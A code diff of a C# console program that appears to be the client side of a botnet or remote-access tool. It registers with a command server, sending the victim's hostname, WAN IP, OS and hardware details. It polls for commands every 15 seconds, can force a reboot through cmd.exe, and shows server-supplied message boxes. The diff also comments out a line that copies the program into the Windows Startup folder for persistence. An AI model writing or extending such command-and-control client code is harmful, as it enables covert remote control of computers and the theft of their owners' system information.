@@ -31,6 +31,7 @@ namespace ConsoleApplication1
                 string webRequest = wClient.DownloadString(GlobalVar.connection + "connect.php?online=1&guid=" + GlobalVar.guid);
                 //Start the command thread
                 System.Threading.Timer t = new System.Threading.Timer(CommandWait, null, 0, 15000);
+                Console.ReadLine();
             }
             else
             {
@@ -40,9 +41,10 @@ namespace ConsoleApplication1
                 WebClient wClient = new WebClient();
                 string webRequest = wClient.DownloadString(GlobalVar.connection + "connect.php?new=1&guid=" + GlobalVar.guid + "&hostname=" + getHostname() + "&ipaddress=" + getWANIP() + "&os=" + getOS() + "&ram=" + getRAM() + "&processor=" + getProcessor() + "&gpu=" + getGPU());
                 //Move to startup folder
-                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                //File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                 //Start the command thread
                 System.Threading.Timer t = new System.Threading.Timer(CommandWait, null, 0, 15000);
+                Console.ReadLine();
             }
         }
 
@@ -69,8 +71,9 @@ namespace ConsoleApplication1
                         Process.Start("cmd.exe", "/c shutdown -r -t 00");
                         break;
                     case "msgbox":
-                        string msg = wClient.DownloadString(GlobalVar.connection + "commands/msg.php?guid=" + GlobalVar.guid);
-                        MessageBox.Show(msg);
+                        string msg = wClient.DownloadString(GlobalVar.connection + "commands/msg.php?request=1&guid=" + GlobalVar.guid);
+                        string[] msgboxParms = msg.Split('|');
+                        MessageBox.Show(msgboxParms[1], msgboxParms[0]);
                         break;
                 }
             }
